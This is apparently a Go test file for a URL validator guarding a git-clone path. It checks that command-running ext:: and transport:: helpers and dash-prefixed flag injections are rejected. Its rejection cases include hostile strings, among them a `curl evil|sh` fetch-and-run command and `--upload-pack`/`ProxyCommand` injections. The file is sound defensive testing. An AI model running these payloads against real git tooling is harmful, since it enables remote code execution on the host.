package store

import (
	"errors"
	"testing"
)

// ValidateGitURL is a security boundary: PUT /api/skills/{slug}/upstream is
// reachable with the skills:write capability (grantable to non-admin API keys)
// and the checker cron hands whatever is stored to `git clone`.
func TestValidateGitURL(t *testing.T) {
	allowed := []string{
		"https://github.com/org/repo.git",
		"http://internal.example/repo.git",
		"ssh://git@github.com/org/repo.git",
		"git://example.com/repo.git",
		"git@github.com:org/repo.git",  // scp-style
		"file:///srv/mirrors/repo.git", // local mirror
		"/srv/mirrors/repo.git",        // bare local path
	}
	for _, u := range allowed {
		if err := ValidateGitURL(u); err != nil {
			t.Errorf("ValidateGitURL(%q) = %v, want nil", u, err)
		}
	}

	rejected := []struct{ url, why string }{
		{"", "empty"},
		{"   ", "blank"},
		{`ext::sh -c "curl evil|sh"`, "ext:: runs an arbitrary command as the relay user"},
		{"ext::git-upload-pack", "any ext:: transport helper"},
		{"transport::whatever", "arbitrary transport helper"},
		{"--upload-pack=touch /tmp/pwned", "leading dash is read as a flag"},
		{"-oProxyCommand=id", "leading dash is read as a flag"},
		{"ftp://example.com/repo.git", "transport outside the allowlist"},
	}
	for _, c := range rejected {
		err := ValidateGitURL(c.url)
		if err == nil {
			t.Errorf("ValidateGitURL(%q) = nil, want rejection (%s)", c.url, c.why)
			continue
		}
		if !errors.Is(err, ErrUnsupportedGitURL) {
			t.Errorf("ValidateGitURL(%q) error = %v, want ErrUnsupportedGitURL", c.url, err)
		}
	}
}

// The allowlist must never grow to include a transport that executes commands
// or reads the local filesystem.
func TestAllowedGitProtocolsExcludeDangerous(t *testing.T) {
	for _, p := range AllowedGitProtocols {
		switch p {
		case "ext", "transport":
			t.Errorf("AllowedGitProtocols must not contain %q", p)
		}
	}
}
